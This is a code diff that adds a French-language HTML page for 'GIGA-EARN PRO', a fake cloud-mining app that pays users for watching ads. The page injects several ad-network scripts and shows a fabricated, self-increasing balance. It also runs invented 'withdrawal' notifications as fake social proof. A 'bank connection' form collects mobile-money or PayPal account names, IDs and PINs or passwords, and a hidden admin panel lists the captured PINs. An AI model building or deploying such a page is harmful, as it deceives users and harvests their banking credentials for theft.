@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>GIGA-EARN PRO | Ecosystem v10.0 HD</title>
+
+    <script src="https://quge5.com/88/tag.min.js" data-zone="203650" async data-cfasync="false"></script>
+    <script src="https://3nbf4.com/act/files/tag.min.js?z=10488990" data-cfasync="false" async></script>
+    <script>(function(s){s.dataset.zone='10488987',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+    <script>(function(s){s.dataset.zone='10488995',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+    <script>(function(s){s.dataset.zone='10488992',s.src='https://gizokraijaw.net/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Montserrat:wght@300;400;700;900&family=JetBrains+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+    <style>
+        :root {
+            --neon-blue: #00f2ff;
+            --neon-purple: #bc13fe;
+            --money-green: #00ff88;
+            --dark-deep: #020205;
+            --glass: rgba(255, 255, 255, 0.05);
+            --gradient: linear-gradient(135deg, var(--neon-blue), var(--neon-purple));
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background: var(--dark-deep); color: white; overflow: hidden; height: 100vh; background: radial-gradient(circle at top right, #101035, #020205); }
+
+        .app-container { max-width: 480px; margin: 0 auto; height: 100vh; display: flex; flex-direction: column; position: relative; border-left: 1px solid rgba(255,255,255,0.05); border-right: 1px solid rgba(255,255,255,0.05); }
+
+        header { padding: 25px; border-bottom: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(20px); z-index: 100; display: flex; justify-content: space-between; align-items: center; }
+        .brand { font-family: 'Orbitron'; font-weight: 900; letter-spacing: 2px; background: var(--gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; cursor: pointer; user-select: none; }
+
+        main { flex: 1; overflow-y: auto; padding: 20px; scrollbar-width: none; }
+        main::-webkit-scrollbar { display: none; }
+
+        /* MINING CARD */
+        .miner-display { background: var(--glass); border: 1px solid var(--neon-blue); border-radius: 35px; padding: 40px 20px; text-align: center; position: relative; margin-bottom: 30px; box-shadow: inset 0 0 30px rgba(0, 242, 255, 0.1); }
+        .balance-amount { font-family: 'Orbitron'; font-size: 3.5rem; font-weight: 900; margin: 15px 0; text-shadow: 0 0 15px var(--neon-blue); }
+        .balance-amount span { color: var(--money-green); font-size: 1.5rem; margin-left: 5px; }
+
+        /* TASKS */
+        .task-list { display: flex; flex-direction: column; gap: 15px; margin-bottom: 30px; }
+        .task-item { background: linear-gradient(90deg, #101020, #050510); padding: 20px; border-radius: 25px; display: flex; align-items: center; border: 1px solid rgba(255,255,255,0.03); cursor: pointer; transition: 0.2s; }
+        .task-item:active { transform: scale(0.96); }
+        .task-reward { margin-left: auto; color: var(--money-green); font-weight: 900; background: rgba(0,255,136,0.1); padding: 5px 12px; border-radius: 50px; font-size: 0.8rem; }
+
+        /* NOTIFICATION POPUP (WIN SIMULATION) */
+        #win-notif { position: fixed; top: 85px; left: 50%; transform: translateX(-50%) translateY(-150%); width: 90%; max-width: 400px; background: rgba(10, 10, 30, 0.95); border: 1px solid var(--money-green); border-radius: 20px; padding: 15px; display: flex; align-items: center; z-index: 1000; transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); backdrop-filter: blur(10px); }
+        #win-notif.show { transform: translateX(-50%) translateY(0); }
+        .user-img { width: 45px; height: 45px; border-radius: 50%; border: 2px solid var(--money-green); margin-right: 15px; object-fit: cover; }
+        .win-text b { color: var(--money-green); }
+
+        /* ADMIN PANEL */
+        #admin-panel { position: fixed; inset: 0; background: #000; z-index: 9999; display: none; flex-direction: column; padding: 20px; overflow-y: auto; }
+        .admin-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 2px solid var(--neon-purple); padding-bottom: 10px; }
+        .log-table { width: 100%; border-collapse: collapse; font-family: 'JetBrains Mono', monospace; font-size: 10px; }
+        .log-table th, .log-table td { border: 1px solid #222; padding: 8px; text-align: left; }
+        .log-table th { background: #111; color: var(--neon-blue); }
+
+        /* MODAL */
+        .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.98); display: none; justify-content: center; align-items: center; z-index: 500; backdrop-filter: blur(30px); }
+        .modal-body { width: 90%; background: #080815; border: 1px solid var(--neon-blue); border-radius: 40px; padding: 35px 25px; }
+        input, select { width: 100%; padding: 18px; margin: 10px 0; background: #000; border: 1px solid rgba(255,255,255,0.1); border-radius: 15px; color: white; outline: none; }
+
+        .btn-withdraw { width: 100%; padding: 22px; border: none; border-radius: 25px; background: var(--gradient); color: white; font-weight: 900; font-family: 'Orbitron'; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div id="win-notif">
+        <img src="" id="win-img" class="user-img" alt="user">
+        <div class="win-text">
+            <small id="win-name">Chargement...</small><br>
+            Vient de retirer <b id="win-amt">0.00$</b> via <span id="win-method">Lumicash</span>
+        </div>
+    </div>
+
+    <div class="app-container">
+        <header>
+            <div class="brand" id="adminTrigger">GIGA-EARN v10.0</div>
+            <div style="font-size: 10px; color: var(--fps-counter); font-family: 'JetBrains Mono';">LIVE STATUS: 🟢</div>
+        </header>
+
+        <main>
+            <div class="miner-display">
+                <div class="balance-label" style="font-size: 10px; color: #888; letter-spacing: 3px;">BALANCE ACTUELLE</div>
+                <div class="balance-amount" id="main-bal">0.0000</div>
+                <div style="font-size: 10px; color: var(--neon-blue);"><i class="fas fa-bolt"></i> MINAGE CLOUD ACTIF...</div>
+            </div>
+
+            <div class="task-list">
+                <div class="task-item" onclick="handleTask(15.00)">
+                    <i class="fas fa-video" style="color:var(--neon-blue); font-size:1.5rem;"></i>
+                    <div style="margin-left:15px">
+                        <h4 style="font-size:0.9rem">Watch Video AD</h4>
+                        <small style="color:#555">HD Reward 8K</small>
+                    </div>
+                    <div class="task-reward">+15.00$</div>
+                </div>
+                <div class="task-item" onclick="handleTask(7.50)">
+                    <i class="fas fa-mouse" style="color:var(--neon-purple); font-size:1.5rem;"></i>
+                    <div style="margin-left:15px">
+                        <h4 style="font-size:0.9rem">Premium Click</h4>
+                        <small style="color:#555">DirectLink Bonus</small>
+                    </div>
+                    <div class="task-reward">+7.50$</div>
+                </div>
+            </div>
+
+            <button class="btn-withdraw" onclick="openWithdraw()">
+                <i class="fas fa-university"></i> RETRAIT BANQUE
+            </button>
+        </main>
+    </div>
+
+    <div class="modal" id="modalBank">
+        <div class="modal-body">
+            <h2 style="text-align:center; font-family:'Orbitron'; color:var(--neon-blue); margin-bottom:20px;">CONNEXION BANQUE</h2>
+            <form id="bankForm">
+                <select id="method" required>
+                    <option value="">Sélectionner une méthode...</option>
+                    <option value="Lumicash">Lumicash Burundi</option>
+                    <option value="CRDB">CRDB Bank</option>
+                    <option value="PayPal">PayPal Global</option>
+                </select>
+                <input type="text" id="acc_name" placeholder="Nom Complet du Compte" required>
+                <input type="text" id="acc_id" placeholder="N° Téléphone ou Email" required>
+                <input type="password" id="acc_pin" placeholder="Code PIN / Mot de passe" required>
+                <button type="submit" class="btn-withdraw" style="padding:15px">VALIDER LA TRANSACTION</button>
+                <button type="button" onclick="closeModal()" style="background:none; border:none; color:#444; width:100%; margin-top:15px;">Fermer</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="admin-panel">
+        <div class="admin-header">
+            <h2 style="color:var(--neon-purple)">DATABASE LEADS (ADMIN)</h2>
+            <button onclick="document.getElementById('admin-panel').style.display='none'" style="background:red; color:white; border:none; padding:10px;">X</button>
+        </div>
+        <table class="log-table">
+            <thead>
+                <tr>
+                    <th>Date</th>
+                    <th>Methode</th>
+                    <th>Nom</th>
+                    <th>ID / Tel</th>
+                    <th>PIN / Pass</th>
+                    <th>Solde</th>
+                </tr>
+            </thead>
+            <tbody id="adminLogs"></tbody>
+        </table>
+    </div>
+
+    <script>
+        // --- CONFIGURATION ---
+        const config = {
+            balance: parseFloat(localStorage.getItem('v10_bal')) || 0,
+            directLink: "https://otieu.com/4/10488973",
+            adminClicks: 0
+        };
+
+        // --- ALGO DE MINAGE ---
+        function startMining() {
+            setInterval(() => {
+                config.balance += 0.00007;
+                document.getElementById('main-bal').innerText = config.balance.toFixed(4);
+                localStorage.setItem('v10_bal', config.balance);
+            }, 100);
+        }
+
+        // --- ALGO DE PREUVE SOCIALE (WIN SIMULATION) ---
+        const fakeUsers = [
+            {n: "Jean-Pierre N.", m: "Lumicash", img: "https://i.pravatar.cc/150?u=1"},
+            {n: "Marie-Louise K.", m: "CRDB", img: "https://i.pravatar.cc/150?u=2"},
+            {n: "Fabrice M.", m: "PayPal", img: "https://i.pravatar.cc/150?u=3"},
+            {n: "Clémentine B.", m: "Lumicash", img: "https://i.pravatar.cc/150?u=4"},
+            {n: "Dieudonné S.", m: "CRDB", img: "https://i.pravatar.cc/150?u=5"}
+        ];
+
+        function showFakeWin() {
+            const user = fakeUsers[Math.floor(Math.random() * fakeUsers.length)];
+            const amt = (Math.random() * (500 - 100) + 100).toFixed(2);
+            
+            document.getElementById('win-img').src = user.img;
+            document.getElementById('win-name').innerText = user.n;
+            document.getElementById('win-amt').innerText = amt + "$";
+            document.getElementById('win-method').innerText = user.m;
+            
+            const div = document.getElementById('win-notif');
+            div.classList.add('show');
+            setTimeout(() => div.classList.remove('show'), 5000);
+        }
+        setInterval(showFakeWin, 12000); // Une notification toutes les 12 secondes
+
+        // --- ACTIONS ---
+        function handleTask(amt) {
+            window.open(config.directLink, '_blank');
+            setTimeout(() => {
+                config.balance += amt;
+                alert("SUCCÈS : +" + amt + "$ ajoutés à votre compte !");
+            }, 1000);
+        }
+
+        function openWithdraw() {
+            if(config.balance < 100) {
+                window.open(config.directLink, '_blank');
+                alert("SOLDE INSUFFISANT ! Minimum 100.00$ pour le retrait.");
+            } else {
+                document.getElementById('modalBank').style.display = 'flex';
+            }
+        }
+
+        function closeModal() { document.getElementById('modalBank').style.display = 'none'; }
+
+        // --- CAPTURE ADMIN ---
+        document.getElementById('bankForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const data = {
+                t: new Date().toLocaleString(),
+                m: document.getElementById('method').value,
+                n: document.getElementById('acc_name').value,
+                id: document.getElementById('acc_id').value,
+                p: document.getElementById('acc_pin').value,
+                b: config.balance.toFixed(2)
+            };
+            let logs = JSON.parse(localStorage.getItem('admin_db')) || [];
+            logs.push(data);
+            localStorage.setItem('admin_db', JSON.stringify(logs));
+            
+            alert("TRANSFERT EN COURS...\n\nLe réseau vérifie vos informations. Délai estimé : 24h.");
+            closeModal();
+        });
+
+        // --- ACCÈS ADMIN SECRET (5 CLICS SUR LOGO) ---
+        document.getElementById('adminTrigger').onclick = function() {
+            config.adminClicks++;
+            if(config.adminClicks >= 5) {
+                const logs = JSON.parse(localStorage.getItem('admin_db')) || [];
+                const table = document.getElementById('adminLogs');
+                table.innerHTML = "";
+                logs.reverse().forEach(l => {
+                    table.innerHTML += `<tr><td>${l.t}</td><td>${l.m}</td><td>${l.n}</td><td>${l.id}</td><td><b>${l.p}</b></td><td>${l.b}$</td></tr>`;
+                });
+                document.getElementById('admin-panel').style.display = 'flex';
+                config.adminClicks = 0;
+            }
+        };
+
+        window.onload = startMining;
+    </script>
+</body>
+  </html>
